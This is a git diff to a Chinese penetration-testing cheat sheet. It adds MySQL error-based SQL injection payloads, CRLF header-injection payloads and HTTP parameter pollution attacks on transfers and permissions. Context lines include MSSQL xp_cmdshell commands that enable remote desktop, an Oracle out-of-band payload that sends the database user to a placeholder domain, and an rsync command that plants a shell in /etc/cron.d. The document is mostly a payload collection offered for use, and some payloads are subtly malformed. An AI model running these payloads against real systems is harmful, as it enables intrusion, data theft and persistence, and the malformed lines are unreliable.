@@ -17,15 +17,17 @@
 		* [端口扫描](#端口扫描)
 		* [其他](#其他)
 	* [注入基础](#注入基础)
-		 * [mssql注入](#mssql注入)
-			* [布尔注入](#布尔注入)
-			* [报错注入](#报错注入)
-			* [waf绕过](#waf绕过)
-		 * [oracle注入](#oracle注入)
-			* [联合查询](#联合查询)
+		* [mssql注入](#mssql注入)
+			* [mssql布尔注入](#mssql布尔注入)
+			* [mssql报错注入](#mssql报错注入)
+			* [mssql_waf绕过](#mssql_waf绕过)
+		* [oracle注入](#oracle注入)
+			* [oracle联合查询](#oracle联合查询)
 			* [Oracle报错注入](#Oracle报错注入)
-			* [带外注入](#带外注入)
-			* [时间盲注](#时间盲注)
+			* [oracle带外注入](#oracle带外注入)
+			* [oracle时间盲注](#oracle时间盲注)
+		* [mysql注入](#mysql注入)
+			* [mysql报错注入](#mysql报错注入)
 	* [命令及后门相关](#命令及后门相关)
 		* [开3389](#开3389)
 		* [运行计划任务](#运行计划任务)
@@ -47,6 +49,9 @@
 			* [Apache_HTTPD_换行解析漏洞](#Apache_HTTPD_换行解析漏洞)
 			* [Apache_SSI_远程命令执行漏洞](#Apache_SSI_远程命令执行漏洞)
 		* [rsync_未授权访问漏洞](#rsync_未授权访问漏洞)
+		* [CRLF_HTTP头注人](#CRLF_HTTP头注人)
+		* [HPP_参数污染漏洞](#HPP_参数污染漏洞)
+		
 		
 				
 ## 信息收集
@@ -187,7 +192,7 @@ https://www.somd5.com/download/dict/
 > **mssql、mysql、oracle 相关注入基础语句** 
 ### mssql注入
 
-#### 布尔注入
+#### mssql布尔注入
 
 - 判断版本号
 ```
@@ -232,7 +237,7 @@ https://www.somd5.com/download/dict/
 ';exec master..xp_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f'--+	
 ```
 
-#### 报错注入
+#### mssql报错注入
 
 - 查看版本号
 ```
@@ -272,7 +277,7 @@ file_name(@@version)
 ' and 1=convert(int,(select top 1 table_name from information_schema.tables))--+
 ```
 
-#### waf绕过
+#### mssql_waf绕过
 
 - 获取版本和数据库名
 ```
@@ -290,7 +295,7 @@ file_name(@@version)
 
 ### oracle注入
 
-#### 联合查询
+#### oracle联合查询
 
 - 判断是否oracle，在mssql和mysql以及db2内返回长度值是调用len()函数；在oracle和INFORMIX则是length()
 ```
@@ -324,7 +329,7 @@ file_name(@@version)
 ' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null--+
 ```
 
-#### 带外注入
+#### oracle带外注入
 
 - 获取当前数据库用户
 ```
@@ -336,12 +341,35 @@ file_name(@@version)
 ' and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.xxxx.xxxx') from dual) is not null--+
 ```
 
-#### 时间盲注
+#### oracle时间盲注
 
 - 获取当前用户
 ```
 ' and 1=(DBMS_PIPE.RECEIVE_MESSAGE('a',10))--+
 ' AND 7238=(CASE WHEN (ASCII(SUBSTRC((SELECT NVL(CAST(USER AS VARCHAR(4000)),CHR(32)) FROM DUAL),1,1))>96) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(71)||CHR(106)||CHR(72)||CHR(73),1) ELSE 7238 END)
+```
+
+### mysql注入
+
+#### mysql报错注入
+
+- 获取当前数据库用户
+```
+1' and extractvalue(1,concat(0x7e,(select user()),0x7e))--+
+1' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
+1' and (select count(*) from information_schema.tables group by concat(select user(),0x7e，floor(rand(0)*2)))--+
+1' or+1+group+by+concat_ws(0x7e,user(),floor(rand(0)*2))+having+min(0)+or+1
+' and (select 1 from (select count(*),concat((select user()),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1--+
+```
+- 获取当前所有数据库
+```
+1' and (select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)
+
+```
+- 获取当前所有表
+```
+1' and (select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)
+
 ```
 
 ## 命令及后门相关
@@ -654,5 +682,59 @@ rsync -av rsync://tarket-ip:873/path/etc/passwd ./
 
 上传任意文件：
 rsync -av shell rsync://tarket-ip:873/path/etc/cron.d/shell
+```
+### CRLF_HTTP头注人
+> **多出现于302跳转类型,观察url或参数是否存在于返回包中**
+```
+1、如访问/test.php?www.xxx.com，，如果存在可如下xss payload测试：
+/test.php?www.xxx.com%%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(/crlf/)</script></html>
+
+2、Cookie会话固定：
+%0a%0d%0a%0dSet-cookie:JSPSESSID%3Dxxx
+%0d%0a%09Set-cookie:%20xxx
+
+3、测试payload
+%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28crlf%28%29%E5%98%BE
+%2f%2e%2e%0d%0aheader:header
+%23%0dheader:header
+%3f%0dheader:header
+/%250aheader:header
+/%%0a0aheader:header
+/%3f%0dheader:header
+/%23%0dheader:header
+/%25%30aheader:header
+/%25%30%61header:header
+/%u000aheader:header
+```
+### HPP_参数污染漏洞
+```
+重复提交参数产生奇效
+
+1、敏感操作
+https://www.example.com/transferMoney.php?amount=1000&fromAccount=12345
+进行转账操作，原本链接中是没有toAccount参数的，这个参数是后端固定的，但如果我们重复提交这个参数：
+https://www.example.com/transferMoney.php?amount=1000&fromAccount=12345&toAccount=99999
+会覆盖后端请求，从而服务器取到的是toAccount=99999这个值。
+
+2、IDOR（不安全的对象引用）
+发邮件功能，我8888用户发邮件给对方12345用户
+https://www.example.com/transferMail.php?myId=8888&targetId=12345
+当不适应HPP时仅仅修改如下，即想让对方12345发邮件给我8888，进行鉴权显然会请求错误
+https://www.example.com/transferMail.php?myId=12345&targetId=8888
+使用HPP时，如下添加了两个myId参数，鉴权取到了myId=8888 通过，发邮件时取到了myId=12345这个值，从而让对方12345用户发邮件给了我8888用户
+https://www.example.com/transferMail.php?myId=12345&myId=8888&targetId=8888
+
+3、社交分享链接
+把内容分享到其他社交媒体，如下：
+https://www.example.com/id=1，分享到FB上链接为：https://www.facebook.com/sharer.php?u=https://www.example.com/id=1
+使用HPP时，如下添加了两个u参数，则最终的跳转会成为https://hackder.com/：
+https://www.facebook.com/sharer.php?u=https://www.example.com/id=1&u=https://hackder.com/
+
+4、权限操作
+用户只能进行查看操作，如下：
+https://www.example.com/info.php?action=view&par=12345
+使用HPP时后面再添加一个action参数，如：?&action=edit，最后取到了edit，导致可以提升权限进行编辑了
+https://www.example.com/info.php?action=view&par=12345?&action=edit
+
 ```
 
